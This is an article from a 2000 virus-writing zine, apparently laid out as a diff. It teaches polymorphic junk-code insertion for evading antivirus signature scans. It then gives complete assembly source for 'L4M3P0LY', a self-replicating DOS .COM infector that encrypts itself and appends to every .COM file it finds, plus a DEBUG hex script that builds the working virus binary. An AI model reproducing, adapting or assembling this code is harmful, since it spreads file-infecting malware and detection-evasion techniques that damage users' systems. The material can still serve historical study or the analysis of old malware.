@@ -1,0 +1,638 @@
+   _________  SWAT MAGAZINE ISSUE THIRTY ONE JULY 2000   __________
+  /         \___________________________________________/          \
+ /	                    L4M3P0LY Virus                          \
+/                            by EXE-Gency                            \
+-------------------------=---------------------------------------------
+             ù - = [*************************************] = - ù
+         ù - = = [ [              L4M3P0LY               ] ] = = - ù
+ù - - = = = = [ [ [      Polymorphic .COM infector      ] ] ] = = = = - - ù
+ù - - = = = = [ [ [       (the l4m3 kind :P heh)        ] ] ] = = = = - - ù
+         ù - = = [ [ by EXE-Gency (exegency@hotmail.com) ] ] = = - ù
+             ù - = [*************************************] = -ù
+
+
+        I've started learning win32asm with the intention of moving away
+from DOS viruses and into the realm of Windows .EXE infectors but before I
+make the complete transition I wanted to write a polymorphic virus. L4M3P0LY
+is the result.
+        I've never been a sufficiently experianced assembly programmer to
+understand many of the polymorphic viruses that have been created by other
+programmers in the underground and this particular virus was created without
+reading the source code to anyone elses poly engine. It's for this reason
+that the methods I've used to achieve polymorphism are probably inefficient
+compared to those methods used by more experianced programmers. Never mind,
+I'll work through some win32asm polymorphic engines and hopefully create a
+better engine at a later date.
+        Some of those people reading this tutorial will probably be 
+wondering
+what a polymorphic virus actually is. When the first viruses were created,
+Anti-Virus companies used a method called string comparison to detect 
+already
+known computer viruses. This ment that the program had a database of byte
+strings that occur in every generation of a particular virus. If a program
+contains the particular byte string of a virus, then the anti-virus program
+presumes that the file is infected and begins to dis-infect it. It should be
+noted that this method of virus detection also works on encrypted viruses
+because although the encrypted body will change with each generation (the
+first generation will all be XORed with 1, the second generation will all be
+XORed with 2 etc.) the actual decryption routine that is called to decrypt
+the virus body will not alter with each generation. It was for this reason
+that polymorphic viruses were created.
+        A polymorphic virus is simply one which cannot be detected by a
+simple byte string search because the original decryption routine is altered
+in some way to make each generation look completely different. The method
+used most commonly to achieve polymorphism is to insert 'jumk' instructions
+between the actual instructions in the decryption routine. Junk instructions
+are simply instructions that do not alter the actual execution of the code.
+This causes the decryption routine at the top of the virus to look
+differently with each generation.
+
+For a better example, consider the following code:
+
+   mov    ah, 09h     ; Display String
+   lea    dx, Message ; DX points to 'Hello, world!$'
+   int    21h         ; Call DOS interrupt
+   int    20h         ; Return to Operating System
+Message db 'Hello, world!$'
+
+        The above code contains a simple assembly routine that uses function
+09h of interrupt 21h (DOS) to display the string pointed at by DX. The code
+also terminates by calling interrupt 20h. The machine code for the above
+program is as follows:
+
+B4 09 BA 09 01 CD 21 CD 20 48 65 6C 6C 6F 2C 20
+77 6F 72 6C 64 21 24
+
+        If the 'Hello World' program was actually virus, you could detect it
+by searching all program files for the scan string above. If you found that
+above scan string, it would be reasonable to presume that the file you had
+found was infected.
+
+Now consider the following program:
+
+   mov    ah, 09h     ; Display String
+   inc    ax          ; JUNK - Increment AX
+   dec    ax          ; JUNK - Decrement AX
+   lea    dx, Message ; DX points to 'Hello, world!$'
+   cli                ; JUNK - Clear Interrupt flag
+   sti                ; JUNK - Set Interrupt flag
+   int    21h         ; Call DOS interrupt
+   push   cx          ; JUNK - Push CX onto stack
+   pop    cx          ; JUNK - Pop from stack into CX
+   int    20h         ; Return to Operating System
+Message db 'Hello, world!$'
+
+        The above code is an exact copy of the first program with the
+exception that a number of 'junk' instructions have been inserted between
+the real instructions. Couplets such as 'inc ax' and 'dec ax' have no real
+effect on the value of a register (it simply adds one to the value of AX and
+then takes one away) and therefore have no effect on the execution of the
+program. The byte code for the above 'Hello World' program is as follows:
+
+B4 09{40 48}BA 0F 01{FA FB}CD 21{51 59}CD 20 48
+65 6C 6C 6F 2C 20 77 6F 72 6C 64 21 24
+
+        Notice how the above byte string is different to the first one. This
+means that although the first and second programs perform exactly the same
+purpose, the byte code for each is different.
+
+Now consider another version of the 'Hello World' program:
+
+   mov    ah, 09h     ; Display String
+   push   cx          ; JUNK - Push CX onto stack</FONT>
+   pop    cx          ; JUNK - Pop from stack into CX</FONT>
+   lea    dx, Message ; DX points to 'Hello, world!$'
+   inc    ax          ; JUNK - Increment AX</FONT>
+   dec    ax          ; JUNK - Decrement AX</FONT>
+   int    21h         ; Call DOS interrupt
+   cli                ; JUNK - Clear Interrupt flag</FONT>
+   sti                ; JUNK - Set Interrupt flag</FONT>
+   int    20h         ; Return to Operating System
+Message db 'Hello, world!$'
+
+        The above version of the 'Hello World' program also contains garbage
+instructions but this time the garbage instructions are in a different
+sequence. Once again, the execution of the above program will be exactly the
+same as the other two because the junk instructions will have no effect on
+the actual execution. The byte code for the above version of the 'Hello
+World' program is as follows:
+
+B4 09{51 59}BA 0F 01{40 48}CD 21{FA FB}CD 20 48
+65 6C 6C 6F 2C 20 77 6F 72 6C 64 21 24
+
+        Once again, the byte code for the third version of the 'Hello World'
+program is different to the previous two.
+
+        The overall purpose of the above demonstation was simply to explain
+how a program can be made to 'look' different (from a byte code perspective)
+without actually executing differently. If the 'Hello World' program was a
+virus, it would not be possible to detect it by using a byte-string scanner
+because different sequences of bytes will occur in each version of the code.
+
+        In the 'Hello World' programs above, the files achieve polymorphism
+by inserting two instrsution, 2-byte sets. The polymorphic virus that I have
+created uses a selection of two and four instruction sets all of which are
+four bytes long. Between Each line of the decryption algorithm shown below:
+
+                lea     si, [bp + Encrypted]
+                mov     cx, ENCRYPTED_SIZE
+                mov     ah, byte ptr [bp + EncryptionValue]
+LoopAgain:      xor     [si], ah
+                inc     si
+                loop    LoopAgain
+                jmp     Encrypted
+EncryptionValue db      00h
+Encrypted:
+....
+Encrypted virus code goes here
+....
+
+BTW: In the above code BP is the delta offset used for calculating the
+offsets of program data in the appended .COM file.
+
+        Between each instruction, four bytes of 'junk' code will be 
+insterted
+when each new .COM file is found and infected. As I've already mentioned,
+some of the four byte codes are made up of four individual instructions
+whilst some are made up of two instructions. The full table of the junk
+instructions accompanied by their machine code equivalents:
+
++------------------------+--------------+
+| Assembly Code          | Machine Code |
++------------------------+--------------+
+| NOP                    | 90h          |
+| NOP                    | 90h          |
+| NOP                    | 90h          |
+| NOP                    | 90h          |
++------------------------+--------------+
+| CLI                    | FAh          |
+| STI                    | FBh          |
+| CLI                    | FAh          |
+| STI                    | FBh          |
++------------------------+--------------+
+| CLD                    | FCh          |
+| STD                    | FDh          |
+| CLD                    | FCh          |
+| STD                    | FDh          |
++------------------------+--------------+
+| XCHG BX, CX            | 87h D9h      |
+| XCHG CX, BX            | 87h CBh      |
++------------------------+--------------+
+| XCHG BX, DX            | 87h DAh      |
+| XCHG DX, BX            | 87h D3h      |
++------------------------+--------------+
+| XCHG CX, DX            | 87h CAh      |
+| XCHG DX, CX            | 87h D1h      |
++------------------------+--------------+
+| NOT AX                 | F7h D0h      |
+| NOT AX                 | F7h D0h      |
++------------------------+--------------+
+| NOT BX                 | F7h D3h      |
+| NOT BX                 | F7h D3h      |
++------------------------+--------------+
+| NOT CX                 | F7h D1h      |
+| NOT CX                 | F7h D1h      |
++------------------------+--------------+
+| NOT DX                 | F7h D2h      |
+| NOT DX                 | F7h D2h      |
++------------------------+--------------+
+| PUSH AX                | 50h          |
+| PUSH BX                | 53h          |
+| POP BX                 | 5Bh          |
+| POP AX                 | 58h          |
++------------------------+--------------+
+| PUSH AX                | 50h          |
+| PUSH CX                | 51h          |
+| POP CX                 | 59h          |
+| POP AX                 | 58h          |
++------------------------+--------------+
+| PUSH AX                | 50h          |
+| PUSH DX                | 52h          |
+| POP DX                 | 5Ah          |
+| POP AX                 | 58h          |
++------------------------+--------------+
+| PUSH BX                | 53h          |
+| PUSH CX                | 51h          |
+| POP CX                 | 59h          |
+| POP BX                 | 5Bh          |
++------------------------+--------------+
+| PUSH BX                | 53h          |
+| PUSH DX                | 52h          |
+| POP DX                 | 5Ah          |
+| POP BX                 | 5Bh          |
++------------------------+--------------+
+| PUSH CX                | 51h          |
+| PUSH DX                | 52h          |
+| POP DX                 | 5Ah          |
+| POP CX                 | 59h          |
++------------------------+--------------+
+| INC AX                 | 40h          |
+| INC BX                 | 43h          |
+| DEC AX                 | 48h          |
+| DEC BX                 | 4Bh          |
++------------------------+--------------+
+| DEC CX                 | 49h          |
+| DEC DX                 | 4Ah          |
+| INC CX                 | 41h          |
+| INC DX                 | 42h          |
++------------------------+--------------+
+| INC DI                 | 47h          |
+| DEC SI                 | 4Eh          |
+| INC SI                 | 46h          |
+| DEC DI                 | 4Fh          |
++------------------------+--------------+
+| XOR AX, BX             | 33h C3h      |
+| XOR AX, BX             | 33h C3h      |
++------------------------+--------------+
+| XOR DX, CX             | 33h D1h      |
+| XOR DX, CX             | 33h D1h      |
++------------------------+--------------+
+
+        The above table contains a total of 21 different four-byte
+instruction sets. When a non-infected .COM file is encountered, each line of
+the decryption routine will be written to the file followed by one of the 21
+junk instruction sets. The junk instruction set is selected at random by
+using the following assembly code which generates a random number in the
+range of 0 to 20:
+
+Random:         in      ax, 40h ; Get a random number
+                mov     ah, 00h ; Set top half to zero
+                shr     ax, 2   ; Quarter AX
+                cmp     ax, 20  ; Is AX=20?
+                ja      Random  ; AX > 20 so jump to 'Random'
+
+        The above code reads a pseudo random number into AX from port 40h.
+This value is them manipulated and shifted until it is in the range of 0 to
+20. It is then mutiplied by 4 using:
+
+                shl     ax, 2   ; Multiply AX by 4
+
+...and added to the offset of the start of the junk code. The result is that
+a different section of four bytes of junk instructions are selected with 
+each
+generation.
+        By counting the number of times the 'WriteJunk' procedure is called,
+considering the number of individual junk instruction sets and considering
+the size of the encryption key used for encoding the virus, I've been able 
+to
+work out the number of different copies that can exist. :)  (21^8)*255. 
+Which
+is 9.6448e12 in standard form or 9,644,829,137,055 in decimal (otherwise
+known as nine billion, six hundred and fourty four thounsand million, eight
+hundred and thirty seven million, one hundred and thirty seven thousand and
+fifty five!) Cool huh?
+
+        Hmmm. I think thats enough talk about polymorphism and the methods
+used in this virus so I'll continue with the source code. If you wish to
+assemble the source code yourself, you'll need a copy of Borland Turbo
+Assembler:
+
+TASM L4M3P0LY.ASM
+TLINK /T L4M3P0LY.OBJ
+
+Um. Anyway, enough talk. Below is the actual source code:
+
+*****************************************************************************
+
+Prog            segment
+                assume  CS:Prog, DS:Prog, ES:Prog, SS:Prog
+                                       ; Make it a .COM file CS=DS=ES=SS
+                org     100h           ; Entry point is at 0100h (above PSP)
+Main:           db      0E9h, 00h, 00h ; Fake JMP offset
+
+ENCRYPTED_SIZE  equ     offset VirusEnd - offset Encrypted ; Encrypted size
+FIRST_SECTION   equ     offset a - offset VirusStart ; Size of first section
+SECOND_SECTION  equ     offset c - offset b ; Size of second section
+THIRD_SECTION   equ     offset e - offset d ; Size of third section
+FORTH_SECTION   equ     offset g - offset f ; Size of forth section
+FIFTH_SECTION   equ     offset i - offset h ; Size of fifth section
+SIXTH_SECTION   equ     offset k - offset j ; Size of sixth section
+SEVENTH_SECTION equ     offset m - offset l ; Size of seventh section
+EIGTH_SECTION   equ     offset o - offset n ; Size of eighth section
+NINETH_SECTION  equ     offset q - offset p ; Size of nineth section
+
+VirusStart:     call    GetDelta ; Make a Call (and push IP, CS, Flags)
+GetDelta:       pop     bp       ; Pop IP into BP
+a:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+b:
+                sub     bp, offset GetDelta ; Subtract offset to get true 
+Delta offset
+c:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+d:
+                lea     si, [bp + Encrypted] ; Set SI to point to encrypted 
+section
+e:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+f:
+                mov     cx, ENCRYPTED_SIZE ; Move into CX the size of the 
+encrypted section
+g:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+h:
+                mov     ah, byte ptr [bp + EncryptionValue] ; Move 
+encryption value into AH
+i:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+j:
+LoopAgain:      xor     [si], ah ; XOR a byte
+k:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+l:
+                inc     si       ; Set SI to point to next char
+m:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+n:
+                loop    LoopAgain; Do it again
+o:
+db 90h, 90h, 90h, 90h            ; NOP NOP NOP NOP
+p:
+                jmp     Encrypted; Jump past encryption value
+
+EncryptionValue:db      00h ; Value used for XORing
+q:
+Encrypted:      lea     si, [bp + Buffer]  ; Set SI to point to Buffer
+                mov     di, 0100h          ; Set DI to start of .COM file
+                movsb                      ; Move a byte
+                movsw                      ; Move a word
+
+                mov     ah, 1Ah            ; Set the offset of DTA
+                lea     dx, [bp + VirusEnd]; Put it at the bottom of the 
+host
+                int     21h                ; Call DOS interrupt
+
+                mov     ah, 4Eh            ; Find a file
+                lea     dx, [bp + FileMask]; DX points to '*.com'
+                mov     cx, 0000h          ; Find anyfile
+FindNext:       int     21h                ; Call DOS interrupt
+                jnc     OpenFile           ; If not carry then open the file
+                jmp     RestoreDTA         ; Otherwise (no more files) so 
+move the DTA back
+
+OpenFile:       mov     ax, 3D02h          ; Open file for read/write
+                lea     dx, [bp + VirusEnd + 1Eh] ; DX points to filename
+                int     21h                ; Call DOS interrupt
+                jnc     SaveFileHandle     ; No error? Then save file handle
+                jmp     FindMore           ; Otherwise find another file
+
+SaveFileHandle: xchg    ax, bx             ; Move the file handle from AX to 
+BX
+
+                mov     ah, 3Fh            ; Read from file
+                mov     cx, 0003h          ; Read 3 bytes
+                lea     dx, [bp + Buffer]  ; DX points to buffer
+                int     21h                ; Call DOS interrupt
+
+                cmp     byte ptr [bp + Buffer], 0E9h ; Already infected?
+                jnz     SeekEOF            ; No, then seek EOF
+                jmp     Close              ; Yes, close it
+
+SeekEOF:        mov     ax, 4202h          ; Seek end of file
+                mov     cx, 0000h          ; Set CX to zero
+                mov     dx, 0000h          ; Set DX to zero
+                int     21h                ; Call DOS interrupt
+
+                sub     ax, 03h            ; Subtract AX by 3
+                mov     word ptr [bp + JumpBytes + 1], ax ; Save it as the 
+jump
+
+IncrementAgain: inc     byte ptr [bp + EncryptionValue]
+                ; Increase encryption value
+                cmp     byte ptr [bp + EncryptionValue], 00h
+                ; Is it zero?
+                je      IncrementAgain ; Then increment again
+
+                mov     cx, FIRST_SECTION     ; CX holds instruction size
+                lea     dx, [bp + VirusStart] ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, SECOND_SECTION    ; CX holds instruction size
+                lea     dx, [bp + b]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, THIRD_SECTION     ; CX holds instruction size
+                lea     dx, [bp + d]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, FORTH_SECTION     ; CX holds instruction size
+                lea     dx, [bp + f]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, FIFTH_SECTION     ; CX holds instruction size
+                lea     dx, [bp + h]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, SIXTH_SECTION     ; CX holds instruction size
+                lea     dx, [bp + j]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, SEVENTH_SECTION   ; CX holds instruction size
+                lea     dx, [bp + l]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, EIGTH_SECTION     ; CX holds instruction size
+                lea     dx, [bp + n]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                Call    WriteJunk             ; Write junk instructions
+
+                mov     cx, NINETH_SECTION    ; CX holds instruction size
+                lea     dx, [bp + p]          ; DX points to real 
+instruction
+                Call    WriteNormal           ; Write normal instructions
+
+                lea     si, [bp + Encrypted]  ; SI points to encrypted 
+section
+                mov     cx, ENCRYPTED_SIZE    ; CX holds encrypted code size
+WriteByte:      mov     ah, byte ptr [bp + EncryptionValue]
+                ; Move encryption value into AH
+                mov     al, byte ptr [si]     ; Move a byte into AL
+                xor     al, ah                ; XOR a byte
+                mov     byte ptr [bp + OneByte], al ; Put it in 'OneByte'
+
+                push    cx                ; Save CX
+
+                mov     ah, 40h           ; Write to file
+                mov     cx, 0001h         ; Write one byte
+                lea     dx, [bp + OneByte]; DX points to 'OneByte'
+                int     21h               ; Call DOS interrupt
+
+                pop     cx                ; Retieve CX
+
+                inc     si                ; Increment SI
+                loop    WriteByte         ; XOR another byte
+
+                mov     ax, 4200h         ; Seek start of file
+                mov     cx, 0000h         ; Set CX to zero
+                mov     dx, 0000h         ; Set DX to zero
+                int     21h               ; Call DOS interrupt
+
+                mov     ah, 40h           ; Write to file
+                mov     cx, 0003h         ; Write 3 bytes
+                lea     dx, [bp + JumpBytes] ; DX points to jump bytes
+                int     21h               ; Call DOS interrupt
+
+Close:          mov     ah, 3Eh           ; Close file
+                int     21h               ; Call DOS interrupt
+
+FindMore:       mov     ah, 4Fh           ; Find another file
+                jmp     FindNext          ; Do it!
+
+RestoreDTA:     mov     ah, 1Ah           ; Set offset of DTA
+                mov     dx, 0080h         ; Put it back in the PSP
+                int     21h               ; Call DOS interrupt
+                mov     ax, 0100h         ; move 0100h into AX
+                push    ax                ; Push it to stack (in place of 
+IP)
+                ret                       ; Return to CS:0100h
+
+;**************************************************************
+;         W R I T E   N O R M A L   P R O C E D U R E         *
+;**************************************************************
+; Upon calling this procedure, the following conditions must be
+; true:
+; BX = File handle
+; CX = Number of bytes to write
+; DX = Offset of code to write
+
+WriteNormal     proc            ; Start of procedure
+                mov     ah, 40h ; Write to file
+                int     21h     ; Call DOS interrupt
+                ret             ; Return from procedure
+WriteNormal     endp            ; End of procedure
+
+;**************************************************************
+; END END END END END END END END END END END END END END END *
+;**************************************************************
+
+;**************************************************************
+;           W R I T E   J U N K   P R O C E D U R E           *
+;**************************************************************
+
+WriteJunk       proc            ; Start of procedure
+                push    bx      ; Save file handle on stack
+
+Random:         in      ax, 40h ; Get a random number
+                mov     ah, 00h ; Set top half to zero
+                shr     ax, 2   ; Quarter AX
+                cmp     ax, 20  ; Is AX=20?
+                ja      Random  ; AX > 20 so jump to 'Random'
+
+                shl     ax, 2   ; Multiply AX by 4
+                lea     dx, [bp + JunkData] ; Set DX to start of junk code
+                add     dx, ax  ; Add AX and DX
+
+                pop     bx      ; Retrieve file handle
+                mov     ah, 40h ; Write to file
+                mov     cx, 4   ; Write 4 bytes
+                int     21h     ; Call DOS interrupt
+                ret             ; Return from procedure
+
+JunkData :                ; Below is the actual junk instructions
+db 090h, 090h, 090h, 090h ; NOP       NOP       NOP       NOP
+db 0FAh, 0FBh, 0FAh, 0FBh ; CLI       STI       CLI       STI
+db 0FCh, 0FDh, 0FCh, 0FDh ; CLD       STD       CLD       STD
+db 087h, 0D9h, 087h, 0CBh ; XCHG BX, CX         XCHG CX, BX
+db 087h, 0DAh, 087h, 0D3h ; XCHG BX, DX         XCHG DX, BX
+db 087h, 0CAh, 087h, 0D1h ; XCHG CX, DX         XCHG DX, CX
+db 0F7h, 0D0h, 0F7h, 0D0h ; NOT AX              NOT AX
+db 0F7h, 0D3h, 0F7h, 0D3h ; NOT BX              NOT BX
+db 0F7h, 0D1h, 0F7h, 0D1h ; NOT CX              NOT CX
+db 0F7h, 0D2h, 0F7h, 0D2h ; NOT DX              NOT DX
+db 050h, 053h, 05Bh, 058h ; PUSH AX   PUSH BX   POP BX    POP AX
+db 050h, 051h, 059h, 058h ; PUSH AX   PUSH CX   POP CX    POP AX
+db 050h, 052h, 05Ah, 058h ; PUSH AX   PUSH DX   POP DX    POP AX
+db 053h, 051h, 059h, 05Bh ; PUSH BX   PUSH CX   POP CX    POP BX
+db 053h, 052h, 05Ah, 05Bh ; PUSH BX   PUSH DX   POP DX    POP BX
+db 051h, 052h, 05Ah, 059h ; PUSH CX   PUSH DX   POP DX    POP CX
+db 040h, 043h, 048h, 04Bh ; INC AX    INC BX    DEC AX    DEC BX
+db 049h, 04Ah, 041h, 042h ; DEC CX    DEC DX    INC CX    INC DX
+db 047h, 04Eh, 046h, 04Fh ; INC DI    DEC SI    INC SI    DEC DI
+db 033h, 0C3h, 033h, 0C3h ; XOR AX, BX          XOR AX, BX
+db 033h, 0D1h, 033h, 0D1h ; XOR DX, CX          XOR DX, CX
+WriteJunk       endp      ; End of WriteJunk procedure
+
+;**************************************************************
+; END END END END END END END END END END END END END END END *
+;**************************************************************
+
+OneByte         db      00h              ; Used for encryption
+FileMask        db      '*.com', 00h     ; Files to search for
+Buffer          db      0CDh, 20h, 00h   ; Fake host (INT 20h)
+JumpBytes       db      0E9h, 00h, 00h   ; Jump bytes
+VirusName       db      '[L4M3P0LY]', 00h; heh
+VirusAuthor     db      'by EXE-Gency of KrashMag', 00h ; /me :P
+VirusEnd:                                ; The end
+Prog            ends                     ; End segment
+end             Main                     ; End program
+
+*****************************************************************************
+
+        Below is a debug script for the virus. Simply save it in a file
+called 'L4M3P0LY.SCR', goto the DOS prompt and type:
+
+debug < L4M3P0LY.scr
+
+...and a file called L4M3P0LY.COM will appear. This is the virus.
+
+N L4M3P0LY.COM
+E 0100 E9 00 00 E8 00 00 5D 90 90 90 90 81 ED 06 01 90
+E 0110 90 90 90 8D B6 3F 01 90 90 90 90 B9 CD 01 90 90
+E 0120 90 90 8A A6 3E 01 90 90 90 90 30 24 90 90 90 90
+E 0130 46 90 90 90 90 E2 F3 90 90 90 90 EB 02 90 00 8D
+E 0140 B6 E2 02 BF 00 01 A4 A5 B4 1A 8D 96 0C 03 CD 21
+E 0150 B4 4E 8D 96 DC 02 B9 00 00 CD 21 73 03 E9 F5 00
+E 0160 B8 02 3D 8D 96 2A 03 CD 21 73 03 E9 E2 00 93 B4
+E 0170 3F B9 03 00 8D 96 E2 02 CD 21 80 BE E2 02 E9 75
+E 0180 03 E9 C8 00 B8 02 42 B9 00 00 BA 00 00 CD 21 2D
+E 0190 03 00 89 86 E6 02 FE 86 3E 01 80 BE 3E 01 00 74
+E 01A0 F5 B9 04 00 8D 96 03 01 E8 B6 00 E8 B8 00 B9 04
+E 01B0 00 8D 96 0B 01 E8 A9 00 E8 AB 00 B9 04 00 8D 96
+E 01C0 13 01 E8 9C 00 E8 9E 00 B9 03 00 8D 96 1B 01 E8
+E 01D0 8F 00 E8 91 00 B9 04 00 8D 96 22 01 E8 82 00 E8
+E 01E0 84 00 B9 02 00 8D 96 2A 01 E8 75 00 E8 77 00 B9
+E 01F0 01 00 8D 96 30 01 E8 68 00 E8 6A 00 B9 02 00 8D
+E 0200 96 35 01 E8 5B 00 E8 5D 00 B9 04 00 8D 96 3B 01
+E 0210 E8 4E 00 8D B6 3F 01 B9 CD 01 8A A6 3E 01 8A 04
+E 0220 32 C4 88 86 DB 02 51 B4 40 B9 01 00 8D 96 DB 02
+E 0230 CD 21 59 46 E2 E4 B8 00 42 B9 00 00 BA 00 00 CD
+E 0240 21 B4 40 B9 03 00 8D 96 E5 02 CD 21 B4 3E CD 21
+E 0250 B4 4F E9 04 FF B4 1A BA 80 00 CD 21 B8 00 01 50
+E 0260 C3 B4 40 CD 21 C3 53 E5 40 B4 00 D1 E8 D1 E8 3D
+E 0270 14 00 77 F3 D1 E0 D1 E0 8D 96 87 02 03 D0 5B B4
+E 0280 40 B9 04 00 CD 21 C3 90 90 90 90 FA FB FA FB FC
+E 0290 FD FC FD 87 D9 87 CB 87 DA 87 D3 87 CA 87 D1 F7
+E 02A0 D0 F7 D0 F7 D3 F7 D3 F7 D1 F7 D1 F7 D2 F7 D2 50
+E 02B0 53 5B 58 50 51 59 58 50 52 5A 58 53 51 59 5B 53
+E 02C0 52 5A 5B 51 52 5A 59 40 43 48 4B 49 4A 41 42 47
+E 02D0 4E 46 4F 33 C3 33 C3 33 D1 33 D1 00 2A 2E 63 6F
+E 02E0 6D 00 CD 20 00 E9 00 00 5B 4C 34 4D 33 50 30 4C
+E 02F0 59 5D 00 62 79 20 45 58 45 2D 47 65 6E 63 79 20
+E 0300 6F 66 20 4B 72 61 73 68 4D 61 67 00
+RCX
+020C
+W
+Q
